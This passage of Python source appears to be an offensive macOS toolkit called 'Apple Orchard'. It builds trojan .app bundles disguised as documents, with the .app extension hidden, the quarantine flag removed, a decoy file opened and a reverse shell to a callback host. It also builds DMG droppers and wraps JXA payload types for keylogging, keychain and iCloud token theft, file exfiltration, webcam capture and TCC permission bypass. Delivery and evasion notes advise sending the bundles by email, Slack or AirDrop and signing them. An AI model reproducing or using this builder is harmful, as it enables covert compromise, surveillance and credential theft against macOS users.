# You can use: sips -i icon.png then cp icon.png "$APP_DIR/Contents/Resources/icon.icns"

# Hide the .app extension in Finder
# This makes "Document.pdf.app" appear as "Document.pdf"
xattr -wx com.apple.FinderInfo \\
    "00 00 00 00 00 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" \\
    "$APP_DIR"

# Remove quarantine flag (if possible)
xattr -d com.apple.quarantine "$APP_DIR" 2>/dev/null

echo "[+] Bundle created: $APP_DIR"
echo "[*] Add your decoy file to: $APP_DIR/Contents/Resources/"
echo "[*] When user double-clicks, they see the 'document' but shell connects to {config.callback_host}:{config.callback_port}"
'''
        
        # Python builder for programmatic creation
        python_builder = f'''
import os
import plistlib
import stat

def create_bundle():
    bundle_name = "{bundle_name}.app"
    
    # Create directories
    os.makedirs(f"{{bundle_name}}/Contents/MacOS", exist_ok=True)
    os.makedirs(f"{{bundle_name}}/Contents/Resources", exist_ok=True)
    
    # Write Info.plist
    info_plist = {repr(info_plist)}
    with open(f"{{bundle_name}}/Contents/Info.plist", 'wb') as f:
        plistlib.dump(info_plist, f)
    
    # Write executable
    main_script = """{main_script}"""
    with open(f"{{bundle_name}}/Contents/MacOS/main", 'w') as f:
        f.write(main_script)
    
    # Make executable
    os.chmod(f"{{bundle_name}}/Contents/MacOS/main", 
             stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
    
    print(f"[+] Bundle created: {{bundle_name}}")

if __name__ == "__main__":
    create_bundle()
'''
        
        return {
            "success": True,
            "bundle_name": bundle_name + ".app",
            "bundle_id": bundle_id,
            "disguise_type": config.disguise_type.value,
            "callback": f"{config.callback_host}:{config.callback_port}",
            "info_plist": info_plist,
            "main_script": main_script,
            "jxa_payload": jxa_payload,
            "build_script": build_script,
            "python_builder": python_builder,
            "delivery_notes": [
                "1. Run build script to create the .app bundle",
                "2. Add a real PDF/JPG as decoy file in Resources/",
                "3. Extract icon from real document for authenticity",
                "4. Send via email, Slack, AirDrop, USB, etc.",
                "5. When user double-clicks, they see 'document' opening",
                "6. Meanwhile, reverse shell connects to your server"
            ],
            "evasion_notes": [
                "LSUIElement=true hides app from Dock",
                "com.apple.FinderInfo hides .app extension",
                "Opening real decoy makes it look legitimate",
                "Bundle appears as normal document in Finder",
                "Gatekeeper may still warn if unsigned"
            ],
            "signing_info": {
                "note": "For better evasion, sign with valid Apple Developer ID",
                "command": "codesign --sign 'Developer ID Application: Name' --deep --force bundle.app"
            }
        }
    
    def generate_dropper_dmg(self, config: BundleBackdoor) -> Dict[str, Any]:
        """Generate DMG dropper with hidden payload"""
        
        dmg_script = f'''#!/bin/bash
# DMG Dropper Generator

WORK_DIR="/tmp/dmg_build_$$"
DMG_NAME="{config.app_name}"
VOLUME_NAME="Install {config.app_name}"

mkdir -p "$WORK_DIR"

# Create the malicious app bundle first
# (use generate_bundle output)

# Create DMG structure
mkdir -p "$WORK_DIR/dmg_contents"
cp -r "{config.app_name}.app" "$WORK_DIR/dmg_contents/"

# Create symlink to Applications (classic technique)
ln -s /Applications "$WORK_DIR/dmg_contents/Applications"

# Create DMG
hdiutil create -volname "$VOLUME_NAME" \\
    -srcfolder "$WORK_DIR/dmg_contents" \\
    -ov -format UDZO \\
    "$DMG_NAME.dmg"

# Optional: Add background image
# hdiutil attach "$DMG_NAME.dmg"
# cp background.png "/Volumes/$VOLUME_NAME/.background/"
# Set view options via AppleScript...

echo "[+] DMG created: $DMG_NAME.dmg"
echo "[*] User drags 'app' to Applications, runs it, gets pwned"

# Cleanup
rm -rf "$WORK_DIR"
'''
        
        return {
            "success": True,
            "dmg_name": f"{config.app_name}.dmg",
            "build_script": dmg_script,
            "notes": [
                "Classic DMG + drag-to-Applications technique",
                "User thinks they're installing legitimate app",
                "Can include background image for authenticity"
            ]
        }


class AppleOrchard:
    """
    🍎 The Apple Orchard - MacOS Operations Suite
    Main controller class
    """
    
    def __init__(self):
        self.jxa_generator = JXAGenerator()
        self.tcc_manipulator = TCCManipulator()
        self.bundle_generator = AppBundleGenerator()
        
        self.operations = {
            "jxa_payloads": {
                "name": "JXA Payload Generator",
                "description": "Generate JavaScript for Automation payloads",
                "icon": "📜"
            },
            "tcc_bypass": {
                "name": "TCC Database Manipulator",
                "description": "Bypass macOS permission prompts",
                "icon": "🔓"
            },
            "app_bundle": {
                "name": "Application Bundle Backdoor",
                "description": "Create disguised malicious .app bundles",
                "icon": "📦"
            }
        }
    
    def generate_jxa_payload(self, payload_type: str, host: str, port: int, 
                            evasion_level: int = 2, obfuscate: bool = True) -> Dict[str, Any]:
        """Generate JXA payload"""
        
        try:
            ptype = JXAPayloadType(payload_type)
        except ValueError:
            return {"success": False, "error": f"Unknown payload type: {payload_type}"}
        
        config = JXAPayload(
            payload_type=ptype,
            callback_host=host,
            callback_port=port,
            evasion_level=evasion_level,
            obfuscate=obfuscate
        )
        
        return self.jxa_generator.generate(config)
    
    def generate_tcc_bypass(self, target_app: str, permissions: List[str],
                           method: str = "injection") -> Dict[str, Any]:
        """Generate TCC bypass payload"""
        
        perms = []
        for p in permissions:
            try:
                perms.append(TCCPermission(p))
            except ValueError:
                continue
        
        if not perms:
            return {"success": False, "error": "No valid permissions specified"}
        
        config = TCCBypass(
            target_app=target_app,
            permissions=perms,
            method=method
        )
        
        if method == "injection":
            return self.tcc_manipulator.generate_injection_payload(config)
        elif method == "backup":
            return self.tcc_manipulator.generate_backup_restore_bypass(config)
        else:
            return {"success": False, "error": f"Unknown method: {method}"}
    
    def generate_app_bundle(self, app_name: str, disguise: str, 
                           host: str, port: int, decoy_file: str = "") -> Dict[str, Any]:
        """Generate disguised application bundle"""
        
        try:
            disguise_type = BundleDisguise(disguise)
        except ValueError:
            return {"success": False, "error": f"Unknown disguise type: {disguise}"}
        
        config = BundleBackdoor(
            app_name=app_name,
            disguise_type=disguise_type,
            callback_host=host,
            callback_port=port,
            decoy_file=decoy_file
        )
        
        return self.bundle_generator.generate_bundle(config)
    
    def generate_dmg_dropper(self, app_name: str, host: str, port: int) -> Dict[str, Any]:
        """Generate DMG dropper"""
        
        config = BundleBackdoor(
            app_name=app_name,
            callback_host=host,
            callback_port=port
        )
        
        return self.bundle_generator.generate_dropper_dmg(config)
    
    def get_payload_types(self) -> Dict[str, Any]:
        """Get available JXA payload types"""
        
        return {
            "success": True,
            "payload_types": {
                p.value: {
                    "name": p.name.replace("_", " ").title(),
                    "description": self._get_payload_description(p)
                }
                for p in JXAPayloadType
            }
        }
    
    def get_tcc_permissions(self) -> Dict[str, Any]:
        """Get available TCC permission types"""
        
        return {
            "success": True,
            "permissions": {
                p.value: self.tcc_manipulator.permission_info.get(p, {})
                for p in TCCPermission
            }
        }
    
    def get_disguise_types(self) -> Dict[str, Any]:
        """Get available bundle disguise types"""
        
        return {
            "success": True,
            "disguise_types": {
                d.value: {
                    "name": d.name.replace("_", " ").title(),
                    "extension": self.bundle_generator.extension_map.get(d, ""),
                    "uti": self.bundle_generator.disguise_icons.get(d, "")
                }
                for d in BundleDisguise
            }
        }
    
    def _get_payload_description(self, ptype: JXAPayloadType) -> str:
        """Get payload type description"""
        
        descriptions = {
            JXAPayloadType.REVERSE_SHELL: "Connect back shell using native networking",
            JXAPayloadType.KEYLOGGER: "Capture keyboard input via IOKit",
            JXAPayloadType.SCREENSHOT: "Capture screen using Quartz",
            JXAPayloadType.MAIL_READER: "Read emails from Apple Mail",
            JXAPayloadType.SAFARI_CREDS: "Extract Safari browsing data",
            JXAPayloadType.KEYCHAIN_DUMP: "Dump keychain passwords",
            JXAPayloadType.FILE_EXFIL: "Exfiltrate files to C2",
            JXAPayloadType.PERSISTENCE: "Install LaunchAgent persistence",
            JXAPayloadType.CLIPBOARD_MONITOR: "Monitor clipboard contents",
            JXAPayloadType.WEBCAM_CAPTURE: "Capture webcam image",
            JXAPayloadType.MICROPHONE_RECORD: "Record from microphone",
            JXAPayloadType.CONTACTS_DUMP: "Dump address book contacts",
            JXAPayloadType.BROWSER_HISTORY: "Extract browser history",
            JXAPayloadType.ICLOUD_TOKENS: "Extract iCloud authentication tokens"
        }
        
        return descriptions.get(ptype, "")
    
    def get_status(self) -> Dict[str, Any]:
        """Get module status"""
        
        return {
            "success": True,
            "module": "Apple Orchard",
            "version": "1.0",
            "operations": self.operations,
            "jxa_payloads": len(JXAPayloadType),
            "tcc_permissions": len(TCCPermission),
            "disguise_types": len(BundleDisguise),
            "capabilities": [
                "JXA payload generation (14 types)",
                "TCC database manipulation",
                "Application bundle backdoors",
                "DMG dropper generation",
                "LaunchAgent persistence",
                "Keychain extraction",
                "Camera/Microphone access bypass"
            ]
        }


# Singleton instance
_apple_orchard_instance = None

def get_apple_orchard() -> AppleOrchard:
    """Get or create AppleOrchard singleton"""
    global _apple_orchard_instance
    if _apple_orchard_instance is None:
        _apple_orchard_instance = AppleOrchard()
    return _apple_orchard_instance


# CLI interface
if __name__ == "__main__":
    import sys
    
    orchard = get_apple_orchard()
    
    if len(sys.argv) < 2:
        print("🍎 The Apple Orchard - MacOS Operations Suite")
        print("\nUsage:")
        print("  python apple_orchard.py jxa <type> <host> <port>")
        print("  python apple_orchard.py tcc <app> <permission1,permission2>")
        print("  python apple_orchard.py bundle <name> <disguise> <host> <port>")
        print("\nExamples:")
        print("  python apple_orchard.py jxa reverse_shell 10.0.0.1 443")
        print("  python apple_orchard.py tcc /usr/bin/python3 kTCCServiceCamera,kTCCServiceMicrophone")
        print("  python apple_orchard.py bundle Invoice pdf 10.0.0.1 443")
        sys.exit(0)
    
    cmd = sys.argv[1]
    
    if cmd == "jxa" and len(sys.argv) >= 5:
        result = orchard.generate_jxa_payload(
            sys.argv[2], sys.argv[3], int(sys.argv[4])
        )
        print(json.dumps(result, indent=2))
    
    elif cmd == "tcc" and len(sys.argv) >= 4:
        result = orchard.generate_tcc_bypass(
            sys.argv[2], sys.argv[3].split(",")
        )
        print(json.dumps(result, indent=2))
    
    elif cmd == "bundle" and len(sys.argv) >= 6:
        result = orchard.generate_app_bundle(
            sys.argv[2], sys.argv[3], sys.argv[4], int(sys.argv[5])
        )
        print(json.dumps(result, indent=2))
    
    elif cmd == "status":
        result = orchard.get_status()
        print(json.dumps(result, indent=2))
    
    else:
        print(f"Unknown command: {cmd}")
        sys.exit(1)
